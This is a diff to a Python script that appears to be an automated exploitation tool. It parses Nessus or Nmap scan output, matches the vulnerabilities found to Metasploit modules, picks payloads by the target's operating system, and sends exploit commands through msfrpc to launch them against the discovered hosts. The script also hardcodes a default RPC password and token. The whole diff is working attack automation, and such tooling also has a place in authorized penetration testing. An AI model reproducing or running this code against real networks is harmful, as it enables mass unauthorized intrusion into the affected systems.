@@ -14,6 +14,7 @@ from libnessus.parser import NessusParser
 from netaddr import IPNetwork, AddrFormatError
 from subprocess import Popen, PIPE, CalledProcessError
 from libnmap.parser import NmapParser, NmapParserException
+from libnessus.parser import NessusParser
 
 CLIENT = msfrpc.Msfrpc({})
 
@@ -24,6 +25,7 @@ def parse_args():
     parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
     parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
     parser.add_argument("-x", "--xml", help="Nmap XML file")
+    parser.add_argument("-n", "--nessus", help="Nessus .nessus file")
     parser.add_argument("--nmap-args", help='Additional Nmap args, e.g. --nmap-args="--top-ports 1000 --max-rtt-timeout 300"')
     return parser.parse_args()
 
@@ -50,15 +52,14 @@ def run_proc(cmd):
 
     return proc
 
-def parse_nessus(args):
+def get_exploitable_hosts(report):
     '''
     Parses .nessus files for vulnerabilities that metasploit can exploit
     '''
     exploits = {}
 
-    report = NessusParser.parse_fromfile(args.nessus)
-
     for i in report.hosts:
+        operating_sys = i.get_host_properties['operating-system']
         rep_items = i.get_report_items
         for x in rep_items:
             vuln_info = x.get_vuln_info
@@ -69,11 +70,12 @@ def parse_nessus(args):
                         ip = i.address
                         port = vuln_info['port']
                         msf_mod = vuln_info['metasploit_name']
+                        print_good('Found vulnerable host! {}:{} - {}'.format(ip, port, msf_mod))
 
                         if exploits.get(msf_mod):
                             exploits[msf_mod].append((ip, port))
                         else:
-                            exploits[msf_mod] = [(ip, port)]
+                            exploits[msf_mod] = [(operating_sys, ip, port)]
 
     return exploits
 
@@ -284,10 +286,11 @@ def get_req_opts(c_id, module):
     opts = CLIENT.call('module.options', [c_id, module])
     print_info('Required options:')
     for opt_name in opts:
-        if opts[opt_name]['required'] == True:
-            if 'default' not in opts[opt_name]:
-                req_opts.append(opt_name)
-                print('    {}'.format(opt_name))
+        if opts[opt_name].get('required'):
+            if opts[opt_name]['required'] == True:
+                if 'default' not in opts[opt_name]:
+                    req_opts.append(opt_name)
+                    print('    {}'.format(opt_name))
     return req_opts
 
 def get_rhost_var(c_id, module):
@@ -300,8 +303,7 @@ def get_rhost_var(c_id, module):
     for o in req_opts:
         print_info(o)
 
-
-def get_payload(module, nmap_os):
+def get_payload(module, operating_sys):
     '''
     Automatically get compatible payloads
     '''
@@ -320,7 +322,6 @@ def get_payload(module, nmap_os):
     if payloads.get('error'):
         if 'auxiliary' not in module:
             print_bad('Error getting payload for {}'.format(module))
-            embed()
         else:
             # For aux modules we just set an arbitrary real payload
             payload = win_payloads[0]
@@ -328,11 +329,11 @@ def get_payload(module, nmap_os):
         payloads = payloads['payloads']
 
     # Set a preferred payload based on OS
-    if 'windows' in nmap_os.lower():
+    if 'windows' in operating_sys.lower():
         for p in win_payloads:
             if p in payloads:
                 payload = p
-    elif 'nix' in nmap_os.lower():
+    elif 'nix' in operating_sys.lower():
         for p in win_payloads:
             if p in payloads:
                 payload = p
@@ -343,7 +344,9 @@ def get_payload(module, nmap_os):
             print_bad('No preferred payload found, here\'s what was found:')
             for p in payloads:
                 print '    '+p
-            print_info('Setting payload to {} and continuing'.format(win_payloads[0]))
+            print_info('Skipping this exploit')
+            return
+            #print_info('Setting payload to {} and continuing'.format(payloads[0]))
 
         payload = win_payloads[0]
 
@@ -384,12 +387,33 @@ def check_vuln(c_id):
     return False
 
 def run_nessus_exploits(c_id, exploits):
-    for mod in exploits:
-        for ip,port in exploits[mod]:
-            req_opts = get_req_ops(c_id, mod)
-            rhost_var = get_rhost_var(c_id, mod)
+    # There might be a better way to do this but idk it
+    # The way MSF search works is with an OR in between words even wrapped in quotes
+    # ... dumb.
+    print_info("Collecting list of all Metasploit modules...")
+    all_mods = CLIENT.call('module.search', ['a e i o u'])
+    for mod_desc in exploits:
+
+        # convert mod_desc into mod_path
+        path = None
+        for mod in all_mods:
+            if mod['name'] == mod_desc:
+                path = mod['fullname']
+                print_info('Using module {}'.format(path))
+        if not path:
+            print_bad('Error finding module with description: {}'.format(mod_desc))
+            continue
+
+        for operating_sys, ip, port in exploits[mod_desc]:
+            payload = get_payload(path, operating_sys)
+            if not payload:
+                continue
+            rhost_var = get_rhost_var(c_id, path)
+            opts = ''
             cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
-            CLIENT.call('console.write', [c_id, cmd])
+            settings_out = run_console_cmd(c_id, cmd)
+            print_info('Checking if host is vulnerable...')
+            output = run_if_vuln(c_id, cmd)
 
 def run_nmap_exploits(c_id, hosts):
     '''
@@ -524,6 +548,7 @@ def wait_on_busy_console(c_id):
 def main(report, args):
     global CLIENT
 
+    # Authenticate and grab a permanent token
     CLIENT.login(args.username, args.password)
     CLIENT.call('auth.token_add', ['Au70PwN'])
     CLIENT.token = 'Au70PwN'
@@ -535,15 +560,13 @@ def main(report, args):
         c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
         # Wait for response
         time.sleep(2)
-        # Clear output buffer
-        CLIENT.call('console.read', [c_id])['data'].splitlines()
 
     # Get the latest console
     c_id = c_ids[-1]
 
     if args.nessus:
         # exploits = {'msf_module_name':[(ip, port), (ip, port)]
-        exploits = parse_nessus(args)
+        exploits = get_exploitable_hosts(report)
         run_nessus_exploits(c_id, exploits)
         remainder_output = wait_on_busy_console(c_id)
     else:
@@ -557,8 +580,12 @@ if __name__ == "__main__":
     if os.geteuid():
         print_bad('Run as root')
         sys.exit()
-    report = parse_nmap(args)
+    if args.nessus:
+        report = NessusParser.parse_fromfile(args.nessus)
+    else:
+        report = parse_nmap(args)
     main(report, args)
 
 #TODO
 # Add JBoss, Struts, Tomcat, Jenkins, WebSphere
+# Add nmap script scan only after port is found
